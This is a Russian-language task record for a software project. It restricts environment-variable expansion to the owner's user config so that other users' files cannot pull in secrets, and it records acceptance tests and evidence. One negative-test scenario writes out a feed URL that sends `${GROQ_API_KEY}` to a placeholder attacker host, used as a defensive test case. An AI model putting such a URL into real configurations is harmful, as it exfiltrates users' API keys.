---
id: 002
size: S
status: done
reopened: false
---

# Раскрывать `${VAR}` только в файле владельца (#14)

## Goal

Закрыть утечку секретов через `${VAR}` в `data/users/<id>.json` до того, как файлы пользователей начнёт писать Telegram-бот (задачи 003–004, #11).

## Context (решения из уточнения)

- Бот будет Cloudflare Worker на TS, коммитит в репо fine-grained PAT с правом `Contents: read & write`. Такой токен не может менять `.github/workflows/` (нужно отдельное право `Workflows`), поэтому ID владельца задаётся в workflow, а не в файлах, которые пишет бот.
- Владелец — `612722019`, ID и так публичен (имя файла). Значение пишется прямо в `users-digest.yml` как `HORIZON_OWNER_ID: "612722019"` в обеих джобах (`plan` и `digest`).
- Раскрытие: если `id` файла равен `HORIZON_OWNER_ID`, файл проходит через `_expand_env_vars` как сейчас; иначе любая ссылка вида `${NAME}` (тот же `_ENV_VAR_PATTERN`) — `ConfigError`, значение переменной не читается.
- Позиция `due_users`: в джобе `plan` env `HORIZON_OWNER_ID` тоже задан, иначе файл владельца с `${LWN_KEY}` считался бы битым и терял `publish_site` (та же ловушка, что в FINDING 8 задачи 001).

## Acceptance criteria

1. Given `HORIZON_OWNER_ID=111`, файл `111.json` с `${LWN_KEY}` в URL RSS и `"chat_id": "${TELEGRAM_CHAT_ID}"`, env заданы When `load_user` + `apply_overlay` Then обе ссылки раскрыты, как до задачи.
2. Given `HORIZON_OWNER_ID=111` и файл `222.json` без `${...}` When `load_user` Then загружается как до задачи.
3. Given `users-digest.yml` When открыть джобы `plan` и `digest` Then в обеих есть `HORIZON_OWNER_ID: "612722019"`; `uv run python -m src.users due --hour 0` с этим env и без `TELEGRAM_CHAT_ID`/`LWN_KEY` выдаёт `{"user": "612722019", "publish_site": true}`.
4. Given `horizon` без `--user` When запуск Then поведение не меняется; `uv run pytest` зелёный.
5. Given `docs/multi-user.md` When читать раздел о файле пользователя Then описано, что `${VAR}` раскрывается только у владельца и как задаётся `HORIZON_OWNER_ID`.

## Negative scenarios

- N1 (чужой ресурс / секреты): Given `HORIZON_OWNER_ID=111`, файл `222.json` с источником `https://evil.example/feed?k=${GROQ_API_KEY}` и env `GROQ_API_KEY=secret` When `load_user(…, "222")` Then `ConfigError` с путём файла и именем `GROQ_API_KEY`; строка `secret` не встречается ни в тексте ошибки, ни в результате.
- N2 (валидация ввода): Given `HORIZON_OWNER_ID=111` и `222.json` с `"chat_id": "${TELEGRAM_CHAT_ID}"` When загрузка Then `ConfigError`.
- N3: Given `HORIZON_OWNER_ID` не задан (или не число) When загрузка `111.json` с `${LWN_KEY}` Then `ConfigError`, в тексте упомянут `HORIZON_OWNER_ID`; литерал `${LWN_KEY}` никуда не уходит.
- N4: Given `HORIZON_OWNER_ID=111` и `222.json` с `${GROQ_API_KEY}` When `due_users` Then `222` попадает в matrix как битый (`publish_site: false`), его джоба падает, остальные пользователи не затронуты.
- N5: Given в URL источника обычный `$` без `{NAME}` (например `https://x.example/?a=$b`) When загрузка не-владельца Then не ошибка (проверяется только шаблон `${NAME}`).

## Scope

- Change:
  - `src/users/__init__.py` — `load_user`: раскрытие только для владельца, иначе отказ по `_ENV_VAR_PATTERN`.
  - `tests/test_users.py` — новые тесты на AC/N. **Существующие тесты** `test_load_user_expands_env_vars`, `test_overlay_rejects_unexpanded_chat_id`, `test_due_users_does_not_need_chat_env` используют `${TELEGRAM_CHAT_ID}` у пользователя `111`: при новой спецификации им нужен `monkeypatch.setenv("HORIZON_OWNER_ID", "111")`. Assert'ы не меняются — правка только окружения теста, требует вашего «ок» вместе с задачей.
  - `.github/workflows/users-digest.yml` — `HORIZON_OWNER_ID` в env джоб `plan` и `digest`.
  - `docs/multi-user.md` — абзац про `${VAR}` и `HORIZON_OWNER_ID`.
  - `.gitignore` — строки `!CLAUDE.md`, `!.claude/` (требование `/task` для своего репо).
- Do NOT touch: `src/storage/manager.py` (`_expand_env_vars` и `_ENV_VAR_PATTERN` только переиспользовать), `src/models.py`, `src/main.py`, `src/orchestrator.py`, `data/users/612722019.json`, `data/config.github.json`, остальные тесты.
- Pattern: `load_user` и тесты `test_load_user_*` в `tests/test_users.py` (`write_user`, `monkeypatch.setenv`); проверка неразвёрнутого `chat_id` в `apply_overlay` — тот же `_ENV_VAR_PATTERN.search`.

## Plan

## Evidence

| AC | Как проверено | Результат |
|----|---------------|-----------|
| 1 | `tests/test_users.py::test_owner_file_expands_env_vars` (`${LWN_KEY}` в URL и `${TELEGRAM_CHAT_ID}`), `::test_load_user_expands_env_vars` | PASS |
| 2 | `::test_users_do_not_share_sources_or_chat`, `::test_plain_dollar_is_not_an_env_ref` (файлы не-владельца без `${...}` грузятся) | PASS |
| 3 | `HORIZON_OWNER_ID: "612722019"` в `plan` и `digest` (`grep -c` → 2), `uvx check-jsonschema --builtin-schema vendor.github-workflows` → ok; `env -u TELEGRAM_CHAT_ID -u LWN_KEY HORIZON_OWNER_ID=612722019 uv run python -m src.users due --hour 0` → `{"user": "612722019", "publish_site": true}` (без `HORIZON_OWNER_ID` → `false`, ловушка реальна) | PASS |
| 4 | `::test_main_without_user_is_unchanged`; `uv run pytest` → 1020 passed | PASS |
| 5 | `docs/multi-user.md:32` — абзац про раскрытие только у владельца и `HORIZON_OWNER_ID` | PASS |
| N1 | `::test_non_owner_file_cannot_reference_secrets` (ошибка содержит `222.json` и `GROQ_API_KEY`, не содержит `secret-value`); CLI: `uv run horizon --data-dir <tmp> --user 111` с `${GROQ_API_KEY}` → `… references GROQ_API_KEY: environment variables are expanded only in the owner's file (HORIZON_OWNER_ID)`, exit 1 | PASS |
| N2 | `::test_non_owner_chat_id_cannot_reference_env` | PASS |
| N3 | `::test_env_refs_need_owner_id[None/abc/""]` | PASS |
| N4 | `::test_due_users_marks_non_owner_env_refs_broken` (222 в matrix с `publish_site: false`, владелец не затронут); падение джобы 222 = N1; продолжение matrix — `fail-fast: false`, подтверждено в 001 (run 42412369718) | PASS |
| N5 | `::test_plain_dollar_is_not_an_env_ref` | PASS |
| review r1 (2026-11-08) | reviewer | PASS |

Правка окружения в трёх существующих тестах (`HORIZON_OWNER_ID`) подтверждена вами вместе с задачей («подтверждаю», 2026-11-08); assert'ы не менялись.

## Knowledge

- Dead ends: none
- Decisions: [ADR 0002](../docs/decisions/0002-owner-only-env-expansion.md) — владелец определяется только по `HORIZON_OWNER_ID` из workflow.
- Known issues: локальный запуск `horizon --user 612722019` после задачи требует `HORIZON_OWNER_ID` в env или `.env`. Поля `sources.twitter.apify_token_env` / `cookie_dir` обходят запрет `${VAR}` — вынесено в #15 (блокер для 003).
